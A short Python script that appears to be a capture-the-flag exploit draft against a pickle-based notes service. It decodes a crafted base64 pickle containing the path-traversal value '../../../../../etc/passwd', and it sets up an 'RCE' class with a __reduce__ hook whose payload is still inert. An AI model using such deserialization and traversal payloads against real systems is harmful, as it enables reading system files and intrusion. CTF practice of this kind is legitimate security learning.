import pickle
import base64
import os

class Notes:

    def __init__(self, name, notes):

        self.name = name
        self.notes = notes

    def list_notes(self):
        pass

class RCE:
    def __reduce__(self):
        notes = Notes('Note444', ['a'])
        notes.list_notes()
        return Notes, ()


code = 'Y2NvcHlfcmVnCl9yZWNvbnN0cnVjdG9yCnAwCihjX19tYWluX18KTm90ZXMKcDEKY19fYnVpbHRpbl9fCm9iamVjdApwMgpOdHAzClJwNAooZHA1ClZuYW1lCnA2ClZNeSBub3RlcwpwNwpzVm5vdGVzCnA4CihscDkKVmFhYQpwMTAKYVZiYmIKcDExCmFWL2V0Yy9wYXNzd2QKcDEyCmFWLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZApwMTMKYXNiLg=='

if __name__ == '__main__':
    p_code = base64.b64decode(code)
    print(p_code)
    c = pickle.loads(p_code)
    print(c)
    pickled = pickle.dumps(Notes('NOTE444', ['a','b']), protocol=0)
    print(pickled)
    #print(base64.urlsafe_b64encode(pickled))
    with open('./flag.txt') as f:
        print(f.read())

    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
